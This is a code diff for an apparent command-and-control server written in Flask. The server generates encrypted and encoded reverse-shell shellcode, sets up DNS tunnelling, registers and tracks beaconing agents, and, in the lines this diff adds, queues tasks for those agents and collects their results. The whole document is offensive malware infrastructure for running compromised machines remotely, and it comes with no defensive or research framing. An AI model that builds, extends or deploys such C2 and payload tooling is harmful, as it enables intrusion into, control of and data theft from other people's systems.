@@ -32,7 +32,6 @@ if IS_WINDOWS:
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 app = Flask(__name__)
-
 shellcode_gen = ShellcodeGenerator()
 dns_tunnel = DNSTunnel("example.com")
 
@@ -68,7 +67,6 @@ def generate_shellcode():
         key = data.get('key', '')
         shellcode = None
 
-        # Generate shellcode
         if shellcode_type == 'reverse':
             host = data.get('host')
             port = int(data.get('port', 0))
@@ -91,22 +89,14 @@ def generate_shellcode():
         else:
             return jsonify({'success': False, 'error': 'Invalid shellcode type specified'}), 400
 
-        # ✅ Immediately check if shellcode generation failed
         if shellcode is None:
-            return jsonify({'success': False, 'error': 'Shellcode generation failed. Please verify msfvenom installation.'}), 500
+            return jsonify({'success': False, 'error': 'Shellcode generation failed.'}), 500
 
-        # Apply Encryption
         if encryption == 'xor':
             shellcode = shellcode_gen.xor_encrypt(shellcode, key or "defaultxor")
-            if shellcode is None:
-                return jsonify({'success': False, 'error': 'XOR encryption failed'}), 500
-
         elif encryption == 'aes':
             shellcode = shellcode_gen.aes_encrypt(shellcode, key or "defaultaes")
-            if shellcode is None:
-                return jsonify({'success': False, 'error': 'AES encryption failed'}), 500
 
-        # Encoding
         encoded = shellcode_gen.encode_shellcode(shellcode, encoding)
         if encoded is None:
             return jsonify({'success': False, 'error': 'Encoding failed'}), 500
@@ -137,11 +127,9 @@ def register_agent():
 
         if agent_id:
             if agent_id in agents:
-                # Update existing agent
                 agents[agent_id].update(data)
                 agents[agent_id]['last_seen'] = datetime.now().isoformat()
             else:
-                # Register new agent
                 agents[agent_id] = data
                 agents[agent_id]['last_seen'] = datetime.now().isoformat()
                 agents[agent_id]['results'] = {}
@@ -160,7 +148,6 @@ def agent_beacon():
     try:
         wrapper = request.get_json()
         encoded_data = wrapper.get('data')
-
         if not encoded_data:
             return jsonify({'status': 'error', 'message': 'Missing data'}), 400
 
@@ -226,7 +213,59 @@ def create_task():
 
     return jsonify({'task_id': task_id})
 
-# Add execute_task and result endpoints if not present above
+@app.route('/api/results', methods=['POST'])
+def receive_result():
+    try:
+        data = request.get_json()
+        agent_id = data.get("agent_id")
+        task_id = data.get("task_id")
+        result = data.get("result")
+
+        if agent_id not in results:
+            results[agent_id] = {}
+        results[agent_id][task_id] = result
+
+        if agent_id in agents:
+            agents[agent_id]['results'][task_id] = result
+
+        logging.info(f"[+] Result received from {agent_id} for {task_id}")
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        logging.error(f"Error receiving result: {e}")
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+def execute_task(agent_id, task_id, task_type, task_data):
+    logging.info(f"Task {task_id} assigned to {agent_id} — {task_type}")
+    # Agent will pull and execute
+
+@app.route('/control', methods=['GET'])
+def control_panel():
+    return render_template('control.html')
+
+@app.route('/send_task', methods=['POST'])
+def send_task_from_ui():
+    agent_id = request.form.get("agent_id")
+    task_type = request.form.get("task")
+    task_id = f"task_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    task = {
+        "id": task_id,
+        "type": task_type,
+        "data": {},
+        "status": "pending",
+        "timestamp": datetime.now().isoformat()
+    }
+    if agent_id not in tasks:
+        tasks[agent_id] = []
+    tasks[agent_id].append(task)
+
+    thread = threading.Thread(
+        target=execute_task,
+        args=(agent_id, task_id, task_type, {}),
+        daemon=True
+    )
+    thread.start()
+
+    return jsonify({"status": "sent", "task_id": task_id})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5001)
